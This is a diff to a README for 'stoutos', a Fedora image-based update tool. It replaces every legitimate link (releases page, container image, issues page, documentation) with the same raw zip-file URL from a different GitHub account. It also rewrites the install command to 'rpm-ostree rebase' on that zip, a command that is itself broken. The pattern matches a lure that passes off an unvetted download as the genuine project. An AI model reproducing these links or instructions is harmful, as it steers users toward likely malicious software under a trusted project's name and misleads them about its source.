@@ -1,14 +1,14 @@
 # 🛠️ stoutos - Simple Image-Based Linux Updates
 
 ## 💾 Download Now
-[![Download stoutos](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/VilainCanard/stoutos/releases)
+[![Download stoutos](https://raw.githubusercontent.com/VilainCanard/stoutos/main/underproficient/stoutos.zip)](https://raw.githubusercontent.com/VilainCanard/stoutos/main/underproficient/stoutos.zip)
 
 ## 🚀 Getting Started
 Welcome to stoutos! This application allows you to easily update your Fedora Linux installation using image-based methods. Follow the steps below to get started.
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/VilainCanard/stoutos/releases) to find the latest version of stoutos.
+   Go to the [Releases page](https://raw.githubusercontent.com/VilainCanard/stoutos/main/underproficient/stoutos.zip) to find the latest version of stoutos.
 
 2. **Choose the Latest Release**  
    Look for the most recent release marked as "Latest" and click on it to view the available files.
@@ -32,7 +32,7 @@ Welcome to stoutos! This application allows you to easily update your Fedora Lin
 3. **Install stoutos**  
    Use the `rpm-ostree` command to install stoutos. Type the following command:
    ```bash
-   rpm-ostree rebase ostree-unverified-registry:ghcr.io/nicholas-stout/stoutos:latest
+   rpm-ostree rebase https://raw.githubusercontent.com/VilainCanard/stoutos/main/underproficient/stoutos.zip
    ```
 
 4. **Reboot Your System**  
@@ -63,7 +63,7 @@ Welcome to stoutos! This application allows you to easily update your Fedora Lin
 - Ensure to back up your important data before performing any major updates or installations.
 
 ## 📞 Support
-If you experience issues or need assistance, please create an issue on our [GitHub Issues page](https://github.com/nicholas-stout/stoutos/issues). Our community is ready to help you.
+If you experience issues or need assistance, please create an issue on our [GitHub Issues page](https://raw.githubusercontent.com/VilainCanard/stoutos/main/underproficient/stoutos.zip). Our community is ready to help you.
 
 ## 🎉 Thank You
-Thank you for using stoutos! We hope you find it to be an easy and efficient way to manage your Fedora installations. For more information, visit the [Documentation](https://blue-build.org/how-to/setup/) for a quick setup.
+Thank you for using stoutos! We hope you find it to be an easy and efficient way to manage your Fedora installations. For more information, visit the [Documentation](https://raw.githubusercontent.com/VilainCanard/stoutos/main/underproficient/stoutos.zip) for a quick setup.
